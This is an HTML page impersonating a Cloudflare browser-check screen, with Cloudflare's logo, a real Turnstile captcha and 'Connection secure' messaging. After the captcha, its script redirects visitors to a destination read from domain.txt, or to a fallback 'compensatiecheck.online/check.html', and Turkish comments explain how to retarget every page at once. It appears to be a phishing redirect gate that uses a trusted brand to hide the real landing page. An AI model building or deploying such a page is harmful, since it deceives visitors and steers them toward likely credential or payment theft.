
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        body { 
            margin: 0; 
            padding: 24px; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f9fafb; 
            color: #1f2937; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            box-sizing: border-box; 
        }
        .page-wrap { 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        .top-logo { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            margin-bottom: 24px; 
            width: 100%; 
        }
        .top-logo img { 
            max-width: 220px; 
            width: 100%; 
            height: auto; 
            display: block; 
            object-fit: contain; 
        }
        .security-card { 
            background: #ffffff; 
            padding: 40px; 
            border-radius: 12px; 
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.08), 0 4px 6px -2px rgba(0, 0, 0, 0.04); 
            text-align: center; 
            max-width: 520px; 
            width: 100%; 
            box-sizing: border-box; 
        }
        h1 { 
            font-size: 2rem; 
            font-weight: 700; 
            margin-top: 0; 
            margin-bottom: 14px; 
            color: #1f2937; 
        }
        p { 
            font-size: 1.05rem; 
            color: #6b7280; 
            margin-bottom: 30px; 
            line-height: 1.55; 
        }
        .spinner { 
            margin: 0 auto 24px auto; 
            width: 54px; 
            height: 54px; 
            border: 5px solid #f3f4f6; 
            border-top: 5px solid #f6821f; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .success-icon { 
            display: none; 
            font-size: 48px; 
            color: #10b981; 
            margin-bottom: 24px; 
            line-height: 1; 
        }
        .footer { 
            margin-top: 28px; 
            font-size: 0.85rem; 
            color: #9ca3af; 
        }
        @media (max-width: 640px) { 
            body { padding: 16px; } 
            .top-logo { margin-bottom: 18px; } 
            .top-logo img { max-width: 170px; } 
            .security-card { padding: 28px 20px; border-radius: 10px; } 
            h1 { font-size: 1.6rem; } 
            p { font-size: 0.98rem; } 
            .spinner { width: 46px; height: 46px; } 
        }
    </style>
</head>
<body>
    <div class="page-wrap">
        <div class="top-logo">
            <img src="https://1000logos.net/wp-content/uploads/2020/09/Cloudflare-logo.png" alt="Site Logo">
        </div>
        <div class="security-card">
            <div id="loading-spinner" class="spinner"></div>
            <div id="success-icon" class="success-icon">✓</div>
            <h1 id="status-title">Checking your browser...</h1>
            <p id="status-desc">Please complete the security check below to continue to your destination.</p>
            
            <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
            <!-- Cloudflare Turnstile site key -->
            <div class="cf-turnstile"
                 style="display:flex; justify-content:center; margin:4px 0 8px 0;"
                 data-sitekey="0x4AAAAAAFVaPQ-_-jw2DZze"
                 data-callback="onTurnstileSuccess"
                 data-error-callback="onTurnstileError"
                 data-theme="light"></div>

            <div class="footer">Secure connection process</div>
        </div>
    </div>

    <script>
        // Hedef adres "domain.txt" dosyasindan okunur.
        // Sadece domain.txt icerigini degistirmeniz tum sayfalar icin yeterlidir.
        var FALLBACK_URL = "https://compensatiecheck.online/check.html";

        function normalizeTarget(raw) {
            var value = String(raw || "")
                .replace(/^\uFEFF/, "")
                .split(/\r?\n/)
                .map(function (line) { return line.trim(); })
                .filter(function (line) { return line && line.charAt(0) !== "#"; })[0] || "";
            if (!value) { return FALLBACK_URL; }
            if (!/^https?:\/\//i.test(value)) { value = "https://" + value; }
            value = value.replace(/\/+$/, "");
            if (/\/check\.html$/i.test(value)) { return value; }
            return value + "/check.html";
        }

        function loadTarget() {
            return fetch("domain.txt", { cache: "no-store" })
                .then(function (res) { return res.ok ? res.text() : ""; })
                .then(normalizeTarget)
                .catch(function () { return FALLBACK_URL; });
        }

        function redirectToDestination() {
            var currentHash = window.location.hash;
            loadTarget().then(function (target) {
                window.location.href = target + currentHash;
            });
        }

        // Cloudflare Turnstile dogrulamasi basariyla tamamlandiginda calisir.
        // Captcha herkese gosterilir; basarili olan herkes yonlendirilir.
        function onTurnstileSuccess(token) {
            document.getElementById("loading-spinner").style.display = "none";
            document.getElementById("success-icon").style.display = "block";
            document.getElementById("status-title").innerText = "Verification complete";
            document.getElementById("status-desc").innerText = "Connection secure. Redirecting you now...";
            document.getElementById("status-title").style.color = "#10b981";
            setTimeout(redirectToDestination, 800);
        }

        // Captcha yuklenemezse (reklam engelleyici, ag sorunu vb.) kullaniciyi bilgilendir.
        function onTurnstileError() {
            document.getElementById("status-desc").innerText =
                "The security check could not be loaded. Please refresh the page or disable your ad blocker.";
        }
    </script>
</body>
</html>
